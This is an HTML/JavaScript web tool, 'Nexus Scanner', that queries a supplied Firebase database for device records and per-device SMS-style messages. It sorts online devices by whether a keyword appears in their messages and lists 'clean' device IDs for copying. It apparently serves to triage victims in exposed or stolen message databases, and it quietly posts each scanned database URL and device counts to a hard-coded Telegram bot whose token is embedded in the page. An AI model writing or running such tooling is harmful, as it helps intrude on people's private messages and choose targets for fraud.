<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Scanner | Fast & Online Only</title>
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg-dark: #050505;
            --card-bg: rgba(15, 15, 20, 0.7);
            --border-color: rgba(255, 255, 255, 0.08);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent-cyan: #06b6d4;
            --accent-purple: #8b5cf6;
            --accent-green: #10b981;
            --accent-red: #f43f5e;
            --accent-yellow: #f59e0b;
            --glow-cyan: 0 0 20px rgba(6, 182, 212, 0.4);
            --glow-purple: 0 0 20px rgba(139, 92, 246, 0.4);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Outfit', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 20px;
            /* Animated Background */
            background-image: 
                radial-gradient(circle at 15% 50%, rgba(6, 182, 212, 0.08), transparent 25%),
                radial-gradient(circle at 85% 30%, rgba(139, 92, 246, 0.08), transparent 25%);
            background-attachment: fixed;
            overflow-x: hidden;
        }

        /* Subtle Grid Overlay */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
            background-size: 30px 30px;
            z-index: -1;
            pointer-events: none;
        }

        .container {
            width: 100%;
            max-width: 900px;
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(to right, var(--accent-cyan), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1px;
            margin-bottom: 5px;
            text-transform: uppercase;
        }

        .header p {
            color: var(--text-muted);
            font-size: 14px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        /* Inputs */
        .input-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 16px;
            border: 1px solid var(--border-color);
        }

        @media (max-width: 768px) {
            .input-grid { grid-template-columns: 1fr; }
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .input-group label {
            font-size: 12px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }

        .input-group input {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--text-main);
            padding: 14px 16px;
            border-radius: 10px;
            outline: none;
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            border-color: var(--accent-cyan);
            box-shadow: var(--glow-cyan);
            background: rgba(255, 255, 255, 0.05);
        }

        /* Button */
        .btn-scan {
            width: 100%;
            background: linear-gradient(135deg, rgba(6, 182, 212, 0.2), rgba(139, 92, 246, 0.2));
            color: var(--accent-cyan);
            border: 1px solid var(--accent-cyan);
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            grid-column: 1 / -1;
        }

        .btn-scan:hover:not(:disabled) {
            background: var(--accent-cyan);
            color: #000;
            box-shadow: var(--glow-cyan);
            transform: translateY(-2px);
        }

        .btn-scan:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn-scan:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(6, 182, 212, 0); }
            100% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); }
        }

        /* TG Status */
        .tg-status {
            text-align: center;
            font-size: 13px;
            margin-bottom: 20px;
            min-height: 20px;
            font-weight: 600;
            transition: all 0.3s;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }

        @media (max-width: 768px) {
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .container { padding: 15px; }
            .header h1 { font-size: 24px; }
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 15px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card:hover {
            background: rgba(255, 255, 255, 0.05);
            transform: translateY(-3px);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 3px;
            background: var(--border-color);
            transition: all 0.3s;
        }

        .stat-card.total::before { background: var(--text-muted); }
        .stat-card.online::before { background: var(--accent-cyan); }
        .stat-card.used::before { background: var(--accent-red); }
        .stat-card.unused::before { background: var(--accent-green); }

        .stat-card h3 {
            font-size: 11px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }

        .stat-card p {
            font-size: 24px;
            font-weight: 800;
            font-family: 'Fira Code', monospace;
        }

        .stat-card.total p { color: var(--text-main); }
        .stat-card.online p { color: var(--accent-cyan); }
        .stat-card.used p { color: var(--accent-red); }
        .stat-card.unused p { color: var(--accent-green); }

        /* Progress Bar */
        .progress-container {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            height: 8px;
            margin-bottom: 25px;
            overflow: hidden;
            display: none;
            position: relative;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-purple));
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
            box-shadow: var(--glow-cyan);
        }

        /* Device List */
        .device-section {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            overflow: hidden;
        }

        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.03);
            border-bottom: 1px solid var(--border-color);
        }

        .device-header h2 {
            font-size: 16px;
            color: var(--accent-cyan);
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .btn-copy {
            background: rgba(6, 182, 212, 0.1);
            color: var(--accent-cyan);
            border: 1px solid rgba(6, 182, 212, 0.3);
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-copy:hover {
            background: var(--accent-cyan);
            color: #000;
            box-shadow: var(--glow-cyan);
        }

        .device-list {
            max-height: 350px;
            overflow-y: auto;
            padding: 10px;
            font-family: 'Fira Code', monospace;
        }

        .device-list::-webkit-scrollbar { width: 6px; }
        .device-list::-webkit-scrollbar-track { background: transparent; }
        .device-list::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 10px; }
        .device-list::-webkit-scrollbar-thumb:hover { background: var(--accent-cyan); }

        .device-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 14px;
            color: var(--text-main);
            transition: all 0.2s;
            animation: fadeIn 0.3s ease forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .device-item:hover {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 8px;
        }

        .device-item:last-child { border-bottom: none; }

        .status-badge {
            background: rgba(16, 185, 129, 0.15);
            color: var(--accent-green);
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            border: 1px solid rgba(16, 185, 129, 0.3);
            box-shadow: 0 0 10px rgba(16, 185, 129, 0.1);
        }

        .loading-text {
            text-align: center;
            color: var(--text-muted);
            padding: 30px;
            font-family: 'Outfit', sans-serif;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>Nexus Scanner</h1>
        <p>Fast & Online Only</p>
    </div>

    <div class="input-grid">
        <div class="input-group">
            <label>Firebase Database URL</label>
            <input type="text" id="fbUrl" placeholder="https://your-db.firebaseio.com">
        </div>
        <div class="input-group">
            <label>Target Keyword</label>
            <input type="text" id="keyword" placeholder="e.g. Puresmooth">
        </div>
        <button id="scanBtn" class="btn-scan" onclick="startScan()">Initiate Scan</button>
    </div>

    <div class="tg-status" id="tgStatus"></div>

    <div class="progress-container" id="progressContainer">
        <div class="progress-bar" id="progressBar"></div>
    </div>

    <div class="stats-grid">
        <div class="stat-card total">
            <h3>Total Devices</h3>
            <p id="statTotal">0</p>
        </div>
        <div class="stat-card online">
            <h3>Online Now</h3>
            <p id="statOnline">0</p>
        </div>
        <div class="stat-card used">
            <h3>Used (Hit)</h3>
            <p id="statUsed">0</p>
        </div>
        <div class="stat-card unused">
            <h3>Unused (Clean)</h3>
            <p id="statUnused">0</p>
        </div>
    </div>

    <div class="device-section">
        <div class="device-header">
            <h2><span>🟢</span> CLEAN & ONLINE (<span id="listCount">0</span>)</h2>
            <button class="btn-copy" onclick="copyAllIds()">Copy All IDs</button>
        </div>
        <div class="device-list" id="deviceList">
            <div class="loading-text">Awaiting scan command...</div>
        </div>
    </div>
</div>

<script>
    // ⚙️ BOT CONFIGURATION
    const BOT_TOKEN = "8193791477:AAEVazSxsLxFI1RWiQ4RTmSOObqV_-gy1YI";
    const CHAT_ID = "8287613405";

    let unusedOnlineDevices = [];
    // Increased limit since we only scan online devices now
    const CONCURRENCY_LIMIT = 25; 

    function normalizeUrl(url) {
        let u = url.trim();
        if (u.endsWith('/')) u = u.slice(0, -1);
        if (u.endsWith('.json')) u = u.slice(0, -5);
        return u;
    }

    async function fetchJson(url) {
        try {
            const response = await fetch(url);
            if (!response.ok) return null;
            return await response.json();
        } catch (error) {
            return null;
        }
    }

    function checkKeywordInMessages(messages, keyword) {
        if (!messages || typeof messages !== 'object') return false;
        const kw = keyword.toLowerCase();
        for (const key in messages) {
            const msg = messages[key];
            if (!msg || typeof msg !== 'object') continue;
            const body = (msg.body || msg.message || msg.text || msg.msg || "").toLowerCase();
            const sender = (msg.sender || msg.address || "").toLowerCase();
            if (body.includes(kw) || sender.includes(kw)) return true;
        }
        return false;
    }

    async function asyncPool(poolLimit, array, iteratorFn) {
        const ret = [];
        const executing = [];
        for (const item of array) {
            const p = Promise.resolve().then(() => iteratorFn(item));
            ret.push(p);
            if (poolLimit <= array.length) {
                const e = p.then(() => executing.splice(executing.indexOf(e), 1));
                executing.push(e);
                if (executing.length >= poolLimit) {
                    await Promise.race(executing);
                }
            }
        }
        return Promise.all(ret);
    }

    // 🤖 TELEGRAM ALERT
    async function sendTelegramAlert(url, total, online) {
        const tgStatus = document.getElementById('tgStatus');
        let sentUrls = JSON.parse(localStorage.getItem('sent_fb_alerts') || '[]');
        
        if (sentUrls.includes(url)) {
            tgStatus.innerText = "⚠️ Alert already sent for this URL previously.";
            tgStatus.style.color = "var(--text-muted)";
            return;
        }

        const now = new Date();
        const dateStr = now.toLocaleDateString('en-GB'); 
        const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });

        const message = `✨ NEW ARRIVAL ✨\n\n📍 URL: ${url}\n📊 Devices: ${total} (${online} online)\n📅 ${dateStr} ⏰ ${timeStr}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
            
            const data = await response.json();
            if (data.ok) {
                tgStatus.innerText = "✅ Bot Alert Sent Successfully!";
                tgStatus.style.color = "var(--accent-green)";
                sentUrls.push(url);
                localStorage.setItem('sent_fb_alerts', JSON.stringify(sentUrls));
            } else {
                tgStatus.innerText = "❌ Bot Alert Failed: " + data.description;
                tgStatus.style.color = "var(--accent-red)";
            }
        } catch (e) {
            tgStatus.innerText = "❌ Network Error sending Bot Alert.";
            tgStatus.style.color = "var(--accent-red)";
        }
    }

    // 🔍 MAIN SCAN LOGIC
    async function startScan() {
        let fbUrl = document.getElementById('fbUrl').value;
        let keyword = document.getElementById('keyword').value;
        
        if (!fbUrl || !keyword) {
            alert("Please fill both Firebase URL and Keyword!");
            return;
        }

        fbUrl = normalizeUrl(fbUrl);
        
        const btn = document.getElementById('scanBtn');
        btn.disabled = true;
        btn.innerText = "SCANNING...";
        
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        progressContainer.style.display = 'block';
        progressBar.style.width = '0%';
        
        document.getElementById('tgStatus').innerText = "";
        document.getElementById('deviceList').innerHTML = '<div class="loading-text">Fetching data from Firebase...</div>';
        
        // Reset Stats
        document.getElementById('statTotal').innerText = "0";
        document.getElementById('statOnline').innerText = "0";
        document.getElementById('statUsed').innerText = "0";
        document.getElementById('statUnused').innerText = "0";
        document.getElementById('listCount').innerText = "0";
        unusedOnlineDevices = [];
        let htmlList = "";

        try {
            // 1. Fetch all devices
            let clients = await fetchJson(`${fbUrl}/clients.json`);
            if (!clients || typeof clients !== 'object') {
                clients = await fetchJson(`${fbUrl}/devices.json`);
            }

            if (!clients || typeof clients !== 'object') {
                throw new Error("Invalid Firebase URL or empty data.");
            }

            const allDeviceIds = Object.keys(clients);
            const totalDevices = allDeviceIds.length;
            
            // 2. Filter ONLY ONLINE devices
            const onlineDeviceIds = allDeviceIds.filter(cid => clients[cid] && clients[cid].status === true);
            const totalOnline = onlineDeviceIds.length;

            // Update Stats immediately
            document.getElementById('statTotal').innerText = totalDevices;
            document.getElementById('statOnline').innerText = totalOnline;

            if (totalOnline === 0) {
                document.getElementById('deviceList').innerHTML = '<div class="loading-text" style="color: var(--accent-yellow);">No online devices found to scan.</div>';
                btn.innerText = "SCAN COMPLETE";
                setTimeout(() => { btn.disabled = false; btn.innerText = "INITIATE SCAN"; }, 2000);
                progressContainer.style.display = 'none';
                return;
            }

            // 🚀 TELEGRAM ALERT
            await sendTelegramAlert(fbUrl, totalDevices, totalOnline);

            // 3. Scan ONLY online devices
            let processedCount = 0;
            let usedCount = 0;
            let unusedCount = 0;

            const iteratorFn = async (cid) => {
                // Fetch last 30 messages for speed
                let messages = await fetchJson(`${fbUrl}/messages/${cid}.json?orderBy="$key"&limitToLast=30`);
                
                const isUsed = checkKeywordInMessages(messages, keyword);
                processedCount++;

                if (isUsed) {
                    usedCount++;
                } else {
                    unusedCount++;
                    unusedOnlineDevices.push(cid);
                    // Add to HTML list
                    htmlList += `
                        <div class="device-item">
                            <span>${cid}</span>
                            <span class="status-badge">ONLINE</span>
                        </div>
                    `;
                }

                // Smooth Progress Update
                const percent = Math.floor((processedCount / totalOnline) * 100);
                btn.innerText = `SCANNING (${percent}%)`;
                progressBar.style.width = `${percent}%`;

                document.getElementById('statUsed').innerText = usedCount;
                document.getElementById('statUnused').innerText = unusedCount;
                document.getElementById('listCount').innerText = unusedOnlineDevices.length;
                
                // Update DOM every 3 items to prevent lag
                if (processedCount % 3 === 0 || processedCount === totalOnline) {
                     document.getElementById('deviceList').innerHTML = htmlList || '<div class="loading-text">No clean devices found yet...</div>';
                }
            };

            // Run with high concurrency
            await asyncPool(CONCURRENCY_LIMIT, onlineDeviceIds, iteratorFn);

            // Final DOM Update
            document.getElementById('deviceList').innerHTML = htmlList || '<div class="loading-text" style="color: var(--accent-red);">All online devices are used (Keyword found).</div>';
            btn.innerText = "SCAN COMPLETE";

        } catch (error) {
            document.getElementById('deviceList').innerHTML = `<div class="loading-text" style="color: var(--accent-red);">Error: ${error.message}</div>`;
            btn.innerText = "ERROR";
        } finally {
            setTimeout(() => {
                btn.disabled = false;
                if(btn.innerText !== "ERROR") btn.innerText = "INITIATE SCAN";
                progressContainer.style.display = 'none';
            }, 2500);
        }
    }

    function copyAllIds() {
        if (unusedOnlineDevices.length === 0) {
            alert("No clean IDs available to copy!");
            return;
        }
        const text = unusedOnlineDevices.join('\n');
        navigator.clipboard.writeText(text).then(() => {
            alert(`✅ Copied ${unusedOnlineDevices.length} clean Device IDs!`);
        }).catch(err => {
            alert("Failed to copy: " + err);
        });
    }
</script>

</body>
</html>
